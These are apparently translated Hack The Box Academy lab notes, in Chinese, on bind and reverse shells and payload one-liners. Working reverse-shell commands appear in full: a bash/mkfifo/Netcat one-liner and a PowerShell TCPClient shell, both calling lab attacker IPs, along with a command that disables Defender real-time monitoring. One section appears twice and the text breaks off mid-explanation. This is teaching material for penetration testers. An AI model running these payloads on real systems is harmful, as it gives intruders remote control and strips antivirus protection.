#shell #payload #hacking [source](https://academy.hackthebox.com/module/115/section/1101)

![[Pasted image 20231202081040.png]]

`shell`（命令行解释器）是一个为计算机用户提供接口的程序，用于向系统输入指令并查看文本输出（例如 Bash、Zsh、cmd 和 PowerShell）。作为渗透测试人员和信息安全专业人员，shell 通常是利用漏洞或绕过安全措施以获取主机交互式访问的结果。我们可能听过或读到过以下人们在讨论任务或最近练习时使用的短语：

- `"I caught a shell."（我捕获了一个 shell。）`
- `"I popped a shell!（我弹出了一个 shell！）"`
- `"I dropped into a shell!（我进入了一个 shell！）"`
- `"I'm in!（我进去了！）"`

通常这些短语的意思是这个人已经成功利用了系统上的漏洞，并能够远程控制目标计算机操作系统上的 shell。这是渗透测试人员在尝试访问易受攻击的机器时的常见目标。我们会注意到，本模块的大部分内容将集中在枚举和识别有希望的漏洞利用之后的步骤。

---

## 为什么要获取 Shell？

请记住，shell 使我们能够直接访问`操作系统`、`系统命令`和`文件系统`。因此，如果我们获得访问权限，就可以开始枚举系统，寻找可能允许我们提权、横向移动、传输文件等的向量。如果我们不建立 shell 会话，我们在目标机器上能走多远是相当有限的。

建立 shell 还允许我们在系统上保持持久性，给我们更多的工作时间。它可以使我们更容易使用`攻击工具`、`窃取数据`、`收集`、`存储`和`记录`我们攻击的所有细节，正如我们将在后续演示中看到的那样。需要注意的是，建立 shell 几乎总是意味着我们正在访问操作系统的 CLI（命令行界面），这可能比通过 [VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing) 或 [RDP](https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/) 远程访问图形 shell 更难被发现。熟练掌握命令行界面的另一个重要好处是，它们比图形 shell `更难被检测到`、`更快地导航操作系统`，以及`更容易自动化我们的操作`。我们在本模块中通过以下视角来看待 shell：

|**视角**|**描述**|
|---|---|
|`计算`|用于管理任务和在 PC 上提交指令的基于文本的用户态环境。想想 Bash、Zsh、cmd 和 PowerShell。|
|`漏洞利用` `&` `安全`|shell 通常是利用漏洞或绕过安全措施以获取主机交互式访问的结果。例如在 Windows 主机上触发 [EternalBlue](https://www.cisecurity.org/wp-content/uploads/2019/01/Security-Primer-EternalBlue.pdf) 以远程访问主机上的 cmd 提示符。|
|`Web`|这有点不同。Web shell 与标准 shell 非常相似，只是它利用漏洞（通常是上传文件或脚本的能力）为攻击者提供了一种发出指令、读取和访问文件的方式，并可能对底层主机执行破坏性操作。对 Web shell 的控制通常通过在浏览器窗口中调用脚本来完成。|

---

## Payload 为我们提供 Shell

在整个 IT 行业中，`payload`（有效载荷）可以用几种不同的方式定义：

- `网络`: 在现代计算机网络中传输的数据包的封装数据部分。
- `基础计算`: payload 是定义要执行的操作的指令集部分。去除了头部和协议信息。
- `编程`: 编程语言指令引用或携带的数据部分。
- `漏洞利用 & 安全`: payload 是精心设计的`代码`，旨在利用计算机系统上的漏洞。payload 这个术语可以描述各种类型的恶意软件，包括但不限于勒索软件。

在本模块中，我们将在授予自己对主机的访问权限并与易受攻击的系统建立`远程 shell`会话的背景下，使用许多不同类型的`payload`和交付方法。#shell #webshell #payload #hacking [source](https://academy.hackthebox.com/module/115/section/1103)

每个操作系统都有一个 shell，要与它交互，我们必须使用一个称为`终端模拟器`的应用程序。以下是一些最常见的终端模拟器：

|**终端模拟器**|**操作系统**|
|:--|:--|
|[Windows Terminal](https://github.com/microsoft/terminal)|Windows|
|[cmder](https://cmder.app)|Windows|
|[PuTTY](https://www.putty.org)|Windows|
|[kitty](https://sw.kovidgoyal.net/kitty/)|Windows、Linux 和 MacOS|
|[Alacritty](https://github.com/alacritty/alacritty)|Windows、Linux 和 MacOS|
|[xterm](https://invisible-island.net/xterm/)|Linux|
|[GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal)|Linux|
|[MATE Terminal](https://github.com/mate-desktop/mate-terminal)|Linux|
|[Konsole](https://konsole.kde.org)|Linux|
|[Terminal](https://en.wikipedia.org/wiki/Terminal_(macOS))|MacOS|
|[iTerm2](https://iterm2.com)|MacOS|

这个列表绝不是所有可用的终端模拟器，但它确实包含了一些值得注意的。此外，由于其中许多工具是开源的，我们可以以与开发者原始意图不同的方式将它们安装在不同的操作系统上。但是，这是一个超出本模块范围的项目。选择合适的终端模拟器主要是基于我们在熟悉所选操作系统时形成的工作流程的个人和风格偏好。所以不要让任何人因为选择了某个选项而让你感到不好。我们在目标上交互的终端模拟器本质上取决于系统上原生存在的内容。

---

## 命令语言解释器

就像人类语言翻译员会实时翻译口语或手语一样，`命令语言解释器`是一个程序，用于解释用户提供的指令并将任务发送给操作系统进行处理。因此，当我们讨论命令行界面时，我们知道它是操作系统、终端模拟器应用程序和命令语言解释器的组合。可以使用许多不同的命令语言解释器，其中一些也被称为`shell 脚本语言`或`命令和脚本解释器`，正如 `MITRE ATT&CK Matrix` 的[执行技术](https://attack.mitre.org/techniques/T1059/)中所定义的。我们不需要成为软件开发人员来理解这些概念，但我们了解得越多，在尝试利用易受攻击的系统获取 shell 会话时就越能取得成功。

理解任何给定系统上使用的命令语言解释器也将使我们了解应该使用哪些命令和脚本。让我们动手实践这些概念。

---

## 终端模拟器和 Shell 实践

让我们使用我们的 `Parrot OS` Pwnbox 来进一步探索 shell 的结构。点击屏幕顶部的`绿色`方形图标打开 `MATE` 终端模拟器，然后输入一些随机内容并按回车。

#### 终端示例

![image](https://academy.hackthebox.com/storage/modules/115/green-square.png)

一旦我们选择了图标，它就打开了 MATE 终端模拟器应用程序，该应用程序已预先配置为使用命令语言解释器。在这种情况下，我们通过看到 `$` 符号来"了解"正在使用什么语言解释器。这个 $ 符号在 Bash、Ksh、POSIX 和许多其他 shell 语言中用于标记 `shell 提示符` 的开始，用户可以在此处开始输入命令和其他输入。当我们输入随机文本并按回车时，我们的命令语言解释器被识别出来了。那是 Bash 告诉我们它不识别我们输入的命令。所以在这里，我们可以看到命令语言解释器可以有它们自己识别的一组命令。我们可以识别语言解释器的另一种方法是查看机器上运行的进程。在 Linux 中，我们可以使用以下命令执行此操作：

#### 从 'ps' 验证 Shell

从 'ps' 验证 Shell

```shell-session
tr01ax@htb[/htb]$ ps

    PID TTY          TIME CMD
   4232 pts/1    00:00:00 bash
  11435 pts/1    00:00:00 ps
```

我们还可以通过使用 `env` 命令查看环境变量来找出正在使用的 shell 语言：

#### 使用 'env' 验证 Shell

使用 'env' 验证 Shell

```shell-session
tr01ax@htb[/htb]$ env

SHELL=/bin/bash
```

现在让我们选择 Pwnbox 屏幕顶部的蓝色方形图标。

#### PowerShell 与 Bash 对比

![image](https://academy.hackthebox.com/storage/modules/115/blue-box.png)

选择此图标也会打开 MATE 终端应用程序，但这次使用不同的命令语言解释器。将它们并排放置进行比较。

- `我们能识别出哪些差异？`
- `为什么我们会在同一系统上使用一个而不是另一个？`

我们可以发现无数的差异和自定义。尝试在两者中使用一些你知道的命令，并记下输出的差异以及哪些命令被识别。我们可以从中得出的一个主要观点是，终端模拟器并不绑定到一种特定的语言。实际上，可以更改和自定义 shell 语言以适应系统管理员、开发人员或渗透测试人员的个人偏好、工作流程和技术需求。#shell #bindshell #hacking [source](https://academy.hackthebox.com/module/115/section/1105)

在许多情况下，我们将致力于在本地或远程网络上的系统上建立 shell。这意味着我们将寻求使用本地攻击机上的终端模拟器应用程序通过其 shell 控制远程系统。这通常通过使用 `Bind`（绑定）和/或 `Reverse`（反向）shell 来完成。

---

## 什么是 Bind Shell？

使用 bind shell（绑定 shell），`目标`系统启动一个监听器并等待来自渗透测试人员系统（攻击机）的连接。

#### Bind 示例

![image](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

如图所示，我们将直接使用目标上监听的 `IP 地址`和`端口`进行连接。以这种方式获取 shell 可能会遇到许多挑战。以下是一些需要考虑的：

- 目标上必须已经启动了监听器。
- 如果没有启动监听器，我们需要找到一种方法来实现这一点。
- 管理员通常在网络边缘（面向公众）配置严格的入站防火墙规则和 NAT（使用 PAT 实现），因此我们需要已经在内部网络中。
- 操作系统防火墙（在 Windows 和 Linux 上）可能会阻止大多数与受信任的网络应用程序不相关的入站连接。

在建立 shell 时，操作系统防火墙可能会很麻烦，因为我们需要考虑 IP 地址、端口和用于使连接成功工作的工具。在上面的示例中，用于启动监听器的应用程序称为 [GNU Netcat](https://en.wikipedia.org/wiki/Netcat)。`Netcat`（`nc`）被认为是我们的`瑞士军刀`，因为它可以在 TCP、UDP 和 Unix 套接字上运行。它能够使用 IPv4 和 IPv6，打开和监听套接字，作为代理运行，甚至处理文本输入和输出。我们将在攻击机上使用 nc 作为我们的`客户端`，目标将是`服务器`。

让我们通过使用 Netcat 练习并与同一网络上没有限制的主机建立 bind shell 连接来更深入地理解这一点。

---

## 使用 GNU Netcat 练习

首先，我们需要启动我们的攻击机或 Pwnbox 并连接到 Academy 网络环境。然后确保我们的目标已启动。在这个场景中，我们将与 Ubuntu Linux 系统交互以了解 bind shell 的本质。为此，我们将在客户端和服务器上使用 `netcat`（`nc`）。

通过 ssh 连接到目标机后，启动 Netcat 监听器：

#### 第 1 步：服务器 - 目标启动 Netcat 监听器

第 1 步：服务器 - 目标启动 Netcat 监听器

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

在这种情况下，目标将是我们的服务器，攻击机将是我们的客户端。一旦我们按下回车，监听器就启动了，等待来自客户端的连接。

回到客户端（攻击机），我们将使用 nc 连接到我们在服务器上启动的监听器。

#### 第 2 步：客户端 - 攻击机连接到目标

第 2 步：客户端 - 攻击机连接到目标

```shell-session
tr01ax@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

请注意，我们在客户端和服务器上都使用 nc。在客户端，我们指定服务器的 IP 地址和我们配置为监听的端口（`7777`）。一旦我们成功连接，我们可以在客户端看到如上所示的 `succeeded!` 消息，并在服务器上看到如下所示的 `received!` 消息。

#### 第 3 步：服务器 - 目标接收来自客户端的连接

第 3 步：服务器 - 目标接收来自客户端的连接

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

要知道这不是一个真正的 shell。它只是我们建立的 Netcat TCP 会话。我们可以通过在客户端输入一条简单的消息并查看在服务器端接收到它来看到其功能。

#### 第 4 步：客户端 - 攻击机发送消息 Hello Academy

第 4 步：客户端 - 攻击机发送消息 Hello Academy

```shell-session
tr01ax@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

一旦我们输入消息并按回车，我们会注意到消息在服务器端被接收。

#### 第 5 步：服务器 - 目标接收 Hello Academy 消息

第 5 步：服务器 - 目标接收 Hello Academy 消息

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

注意：在 academy 网络（10.129.x.x/16）上时，我们可以与另一位 academy 学生合作，连接到他们的目标机并练习本模块中介绍的概念。

---

## 使用 Netcat 建立基本的 Bind Shell

我们已经展示了我们可以使用 Netcat 在客户端和服务器之间发送文本，但这不是 bind shell，因为我们无法与操作系统和文件系统交互。我们只能在 Netcat 设置的管道中传递文本。让我们使用 Netcat 提供我们的 shell 来建立一个真正的 bind shell。

在服务器端，我们需要指定`目录`、`shell`、`监听器`，使用一些`管道`，以及`输入`和`输出``重定向`，以确保当客户端尝试连接时，系统的 shell 被提供。

#### 第 1 步：服务器 - 将 Bash shell 绑定到 TCP 会话

第 1 步：服务器 - 将 Bash shell 绑定到 TCP 会话

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

上面的命令被认为是我们的 payload，我们手动交付了这个 payload。我们会注意到，我们 payload 中的命令和代码将根据我们交付到的主机操作系统而有所不同。

回到客户端，使用 Netcat 连接到服务器，现在服务器上正在提供一个 shell。

#### 第 2 步：客户端 - 连接到目标上的 bind shell

第 2 步：客户端 - 连接到目标上的 bind shell

```shell-session
tr01ax@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$
```

我们会注意到我们已经成功地与目标建立了 bind shell 会话。请记住，在这个场景中，我们完全控制了我们的攻击机和目标系统，这并不典型。我们完成这些练习是为了理解 bind shell 的基础知识以及它在没有任何安全控制（启用 NAT 的路由器、硬件防火墙、Web 应用防火墙、IDS、IPS、操作系统防火墙、端点保护、身份验证机制等...）或需要漏洞利用的情况下是如何工作的。当我们遇到更具挑战性的情况和使用易受攻击系统的现实场景时，这种基本理解将会有所帮助。

正如本节前面提到的，还有一点需要记住，bind shell 更容易防御。由于连接将是入站接收的，即使在启动监听器时使用标准端口，它也更有可能被防火墙检测到并阻止。有一些方法可以通过使用反向 shell 来绕过这一点，我们将在下一节讨论。#shell #reverseshell #payload #hacking [source](https://academy.hackthebox.com/module/115/section/1106)

使用 `reverse shell`（反向 shell），攻击机将运行一个监听器，目标需要发起连接。

#### 反向 Shell 示例

![image](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

当我们遇到易受攻击的系统时，我们经常会使用这种 shell，因为管理员很可能会忽略出站连接，从而给我们更好的机会不被发现。上一节讨论了 bind shell 如何依赖于服务器端防火墙允许的入站连接。在现实世界场景中，这将更难实现。如上图所示，我们在攻击机上为反向 shell 启动监听器，并使用某种方法（例如：`无限制文件上传`、`命令注入`等...）强制目标与我们的目标机建立连接，这实际上意味着我们的攻击机成为服务器，目标成为客户端。

当涉及到我们打算在尝试与目标建立反向 shell 时使用的 payload（命令和代码）时，我们并不总是需要重新发明轮子。有一些信息安全老手整理的有用工具可以帮助我们。[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 是一个很棒的资源，其中包含我们在练习或实际任务中可以使用的不同命令、代码，甚至自动化反向 shell 生成器的列表。我们应该注意到，许多管理员知道渗透测试人员常用的公共仓库和开源资源。他们可以将这些仓库作为他们对攻击预期的核心考虑因素的一部分，并相应地调整他们的安全控制。在某些情况下，我们可能需要稍微定制我们的攻击。

让我们动手实践以更好地理解这些概念。

---

## Windows 上的简单反向 Shell 实践

通过本演练，我们将使用一些 PowerShell 代码在 Windows 目标上建立一个简单的反向 shell。让我们启动目标并开始。

我们可以在目标启动时在攻击机上启动 Netcat 监听器。

#### 服务器（攻击机）

服务器（攻击机）

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

这次我们的监听器绑定到一个[常用端口](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html)（`443`），这个端口通常用于 `HTTPS` 连接。我们可能希望使用这样的常用端口，因为当我们发起到监听器的连接时，我们希望确保它不会被操作系统防火墙和网络级别的出站阻止。很少有安全团队会阻止 443 出站，因为许多应用程序和组织在工作日依赖 HTTPS 访问各种网站。也就是说，具有深度包检测和第 7 层可见性的防火墙可能能够检测并阻止通过常用端口出站的反向 shell，因为它检查的是网络数据包的内容，而不仅仅是 IP 地址和端口。详细的防火墙规避超出了本模块的范围，因此我们只会在整个模块中简要介绍检测和规避技术，以及在最后的专门部分中介绍。

一旦 Windows 目标启动，让我们使用 RDP 连接。

Netcat 可用于在 Windows 端发起反向 shell，但我们必须注意系统上已经存在哪些应用程序。Netcat 不是 Windows 系统原生的，因此将它作为 Windows 端的工具可能不可靠。我们将在后面的部分看到，要在 Windows 中使用 Netcat，我们必须将 Netcat 二进制文件传输到目标，当我们一开始没有文件上传功能时，这可能会很棘手。也就是说，理想的做法是使用目标上原生的任何工具（就地取材）来尝试获取访问权限。

`目标上托管了哪些应用程序和 shell 语言？`

这是我们在尝试建立反向 shell 时应该问的一个很好的问题。让我们使用命令提示符和 PowerShell 来建立这个简单的反向 shell。我们可以使用标准的 PowerShell 反向 shell 一行命令来说明这一点。

在 Windows 目标上，打开命令提示符并复制粘贴此命令：

#### 客户端（目标）

客户端（目标）

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

注意：如果我们使用的是 Pwnbox，请记住，某些浏览器在使用剪贴板功能将命令直接粘贴到目标的 CLI 时可能无法无缝工作。在这些情况下，我们可能希望先粘贴到目标上的记事本中，然后从目标内部复制粘贴。

请仔细查看命令并考虑我们需要更改什么才能与攻击机建立反向 shell。这个 PowerShell 代码也可以称为 `shell code` 或我们的 `payload`。考虑到我们出于演示目的完全控制目标，将此 payload 交付到 Windows 系统上相当简单。随着本模块的进展，我们会注意到将 payload 交付到目标的难度增加。

`当我们在命令提示符中按回车时发生了什么？`

#### 客户端（目标）

客户端（目标）

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

`Windows Defender 防病毒`（`AV`）软件阻止了代码的执行。这完全按照预期工作，从`防御`角度来看，这是一个`胜利`。从攻击角度来看，如果我们尝试连接的系统上启用了 AV，则有一些障碍需要克服。为了我们的目的，我们需要通过`病毒和威胁防护设置`禁用防病毒软件，或者在管理员 PowerShell 控制台（右键单击，以管理员身份运行）中使用此命令：

#### 禁用 AV

禁用 AV

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

一旦 AV 被禁用，尝试再次执行代码。

#### 服务器（攻击机）

服务器（攻击机）

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

回到我们的攻击机，我们应该注意到我们成功建立了反向 shell。我们可以通过以 `PS` 开头的提示符的变化以及我们与操作系统和文件系统交互的能力来看到这一点。尝试运行一些标准的 Windows 命令来练习一下。#shell #reverseshell #powershell #windows #hacking [source](https://academy.hackthebox.com/module/115/section/1106)



---

使用 `reverse shell`（反向 shell），攻击机将运行一个监听器，目标需要发起连接。

#### 反向 Shell 示例

![image](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

当我们遇到易受攻击的系统时，我们经常会使用这种 shell，因为管理员很可能会忽略出站连接，从而给我们更好的机会不被发现。上一节讨论了 bind shell 如何依赖于服务器端防火墙允许的入站连接。在现实世界场景中，这将更难实现。如上图所示，我们在攻击机上为反向 shell 启动监听器，并使用某种方法（例如：`无限制文件上传`、`命令注入`等...）强制目标与我们的目标机建立连接，这实际上意味着我们的攻击机成为服务器，目标成为客户端。

当涉及到我们打算在尝试与目标建立反向 shell 时使用的 payload（命令和代码）时，我们并不总是需要重新发明轮子。有一些信息安全老手整理的有用工具可以帮助我们。[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 是一个很棒的资源，其中包含我们在练习或实际任务中可以使用的不同命令、代码，甚至自动化反向 shell 生成器的列表。我们应该注意到，许多管理员知道渗透测试人员常用的公共仓库和开源资源。他们可以将这些仓库作为他们对攻击预期的核心考虑因素的一部分，并相应地调整他们的安全控制。在某些情况下，我们可能需要稍微定制我们的攻击。

让我们动手实践以更好地理解这些概念。

---

## Windows 上的简单反向 Shell 实践

通过本演练，我们将使用一些 PowerShell 代码在 Windows 目标上建立一个简单的反向 shell。让我们启动目标并开始。

我们可以在目标启动时在攻击机上启动 Netcat 监听器。

#### 服务器（攻击机）

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

这次我们的监听器绑定到一个[常用端口](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html)（`443`），这个端口通常用于 `HTTPS` 连接。我们可能希望使用这样的常用端口，因为当我们发起到监听器的连接时，我们希望确保它不会被操作系统防火墙和网络级别的出站阻止。很少有安全团队会阻止 443 出站，因为许多应用程序和组织在工作日依赖 HTTPS 访问各种网站。也就是说，具有深度包检测和第 7 层可见性的防火墙可能能够检测并阻止通过常用端口出站的反向 shell，因为它检查的是网络数据包的内容，而不仅仅是 IP 地址和端口。详细的防火墙规避超出了本模块的范围，因此我们只会在整个模块中简要介绍检测和规避技术，以及在最后的专门部分中介绍。

一旦 Windows 目标启动，让我们使用 RDP 连接。

Netcat 可用于在 Windows 端发起反向 shell，但我们必须注意系统上已经存在哪些应用程序。Netcat 不是 Windows 系统原生的，因此将它作为 Windows 端的工具可能不可靠。我们将在后面的部分看到，要在 Windows 中使用 Netcat，我们必须将 Netcat 二进制文件传输到目标，当我们一开始没有文件上传功能时，这可能会很棘手。也就是说，理想的做法是使用目标上原生的任何工具（[[Lesson 08 - Living off The Land|就地取材]]）来尝试获取访问权限。

`目标上托管了哪些应用程序和 shell 语言？`

这是我们在尝试建立反向 shell 时应该问的一个很好的问题。让我们使用命令提示符和 PowerShell 来建立这个简单的反向 shell。我们可以使用标准的 PowerShell 反向 shell 一行命令来说明这一点。

在 Windows 目标上，打开命令提示符并复制粘贴此命令：
#### 客户端（目标）

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

 注意：如果我们使用的是 Pwnbox，请记住，某些浏览器在使用剪贴板功能将命令直接粘贴到目标的 CLI 时可能无法无缝工作。在这些情况下，我们可能希望先粘贴到目标上的记事本中，然后从目标内部复制粘贴。

请仔细查看命令并考虑我们需要更改什么才能与攻击机建立反向 shell。这个 PowerShell 代码也可以称为 `shell code` 或我们的 `payload`。考虑到我们出于演示目的完全控制目标，将此 payload 交付到 Windows 系统上相当简单。随着本模块的进展，我们会注意到将 payload 交付到目标的难度增加。

`当我们在命令提示符中按回车时发生了什么？`

#### 客户端（目标）

```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

`Windows Defender 防病毒`（`AV`）软件阻止了代码的执行。这完全按照预期工作，从`防御`角度来看，这是一个`胜利`。从攻击角度来看，如果我们尝试连接的系统上启用了 AV，则有一些障碍需要克服。为了我们的目的，我们需要通过`病毒和威胁防护设置`禁用防病毒软件，或者在管理员 PowerShell 控制台（右键单击，以管理员身份运行）中使用此命令：

#### 禁用 AV

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

一旦 AV 被禁用，尝试再次执行代码。

#### 服务器（攻击机）

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

回到我们的攻击机，我们应该注意到我们成功建立了反向 shell。我们可以通过以 `PS` 开头的提示符的变化以及我们与操作系统和文件系统交互的能力来看到这一点。尝试运行一些标准的 Windows 命令来练习一下。

[[06 - Introduction to Payloads|next]]

#shell #payload #hacking #namedpipe #powershell [source](https://academy.hackthebox.com/module/115/section/1131)

---

`你曾经给某人发过电子邮件或短信吗？`

我们大多数人可能都有过。我们在电子邮件或短信中发送的消息是数据包通过广阔的互联网发送时的 payload。在计算中，payload 是预期的消息。在信息安全中，payload 是利用操作系统和/或应用程序中漏洞的命令和/或代码。从防御角度来看，payload 是执行恶意操作的命令和/或代码。正如我们在反向 shell 部分看到的，Windows Defender 阻止了我们 PowerShell payload 的执行，因为它被认为是恶意代码。

请记住，当我们交付和执行 payload 时，就像任何其他程序一样，我们给目标计算机指令告诉它需要做什么。"恶意软件"和"恶意代码"这些术语将过程浪漫化，使其比实际更神秘。每当我们使用 payload 时，让我们挑战自己去探索代码和命令实际上在做什么。我们将通过分解我们之前使用的一行命令来开始这个过程：

---

## 一行命令解析

#### Netcat/Bash 反向 Shell 一行命令

Netcat/Bash 反向 Shell 一行命令

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

上面的命令构成了在 Linux 系统上发出的常见一行命令，用于使用 Netcat 监听器在网络套接字上提供 Bash shell。我们在 Bind Shell 部分早些时候使用过这个。它经常被复制粘贴但不常被理解。让我们分解一行命令的每个部分：

#### 删除 /tmp/f

删除 /tmp/f

```shell-session
rm -f /tmp/f;
```

如果 `/tmp/f` 文件存在则删除它，`-f` 使 `rm` 忽略不存在的文件。分号（`;`）用于顺序执行命令。

#### 创建命名管道

创建命名管道

```shell-session
mkfifo /tmp/f;
```

在指定位置创建一个 [FIFO 命名管道文件](https://man7.org/linux/man-pages/man7/fifo.7.html)。在这种情况下，/tmp/f 是 FIFO 命名管道文件，分号（`;`）用于顺序执行命令。

#### 输出重定向

输出重定向

```shell-session
cat /tmp/f |
```

连接 FIFO 命名管道文件 /tmp/f，管道（`|`）将 cat /tmp/f 的标准输出连接到管道（`|`）后面命令的标准输入。

#### 设置 Shell 选项

设置 Shell 选项

```shell-session
/bin/bash -i 2>&1 |
```

使用 `-i` 选项指定命令语言解释器，以确保 shell 是交互式的。`2>&1` 确保标准错误数据流（`2`）`&` 标准输出数据流（`1`）被重定向到管道（`|`）后面的命令。

#### 使用 Netcat 打开连接

使用 Netcat 打开连接

```shell-session
nc 10.10.14.12 7777 > /tmp/f
```

使用 Netcat（网络工具）发送连接到我们的攻击主机 `10.10.14.12` 的 7777 端口。输出将被重定向（`>`）到 /tmp/f，当反向 shell 单行命令执行时，为我们等待的 Netcat 监听器提供 Bash shell

---

## PowerShell 单行命令详解

我们选择使用的 shell 和 payload（有效载荷）在很大程度上取决于我们攻击的操作系统。在我们继续学习本模块时，请牢记这一点。我们在反向 shell 部分通过使用 PowerShell 与 Windows 系统建立反向 shell 时见证了这一点。让我们分解一下我们使用的单行命令：

#### Powershell 单行命令

Powershell 单行命令

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

我们将剖析上面看到的相当长的 PowerShell 命令。它可能看起来很多，但希望我们能够将其揭秘一些。

#### 调用 PowerShell

调用 PowerShell

```cmd-session
powershell -nop -c
```

执行 `powershell.exe`，不加载配置文件（`nop`）并执行引号中包含的命令/脚本块（`-c`）。这个特定命令是在命令提示符内发出的，这就是为什么 PowerShell 在命令开头。如果我们发现远程代码执行漏洞（RCE，Remote Code Execution），允许我们直接在 `cmd.exe` 中执行命令，知道如何做到这一点是很有用的。

#### 绑定 Socket

绑定 Socket（套接字）

```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

设置/赋值变量 `$client` 等于（`=`）`New-Object` cmdlet，它创建 `System.Net.Sockets.TCPClient` .NET 框架对象的实例。.NET 框架对象将连接到括号中列出的 TCP 套接字 `(10.10.14.158,443)`。分号（`;`）确保命令和代码按顺序执行。

#### 设置命令流

```cmd-session
$stream = $client.GetStream();
```

设置/赋值变量 `$stream` 等于（`=`）`$client` 变量和名为 [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) 的 .NET 框架方法，该方法促进网络通信。分号（`;`）确保命令和代码按顺序执行。

#### 空字节流

```cmd-session
[byte[]]$bytes = 0..65535|%{0};
```

创建一个名为 `$bytes` 的字节类型数组（`[]`），返回 65,535 个零作为数组中的值。这本质上是一个空字节流，将被定向到攻击机上等待连接的 TCP 监听器。

#### 流参数

```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

启动一个 `while` 循环，其中 `$i` 变量设置等于（`=`）.NET 框架 [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0)（`$stream.Read`）方法。参数：buffer（缓冲区，`$bytes`）、offset（偏移量，`0`）和 count（计数，`$bytes.Length`）在方法的括号内定义。

#### 设置字节编码

```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
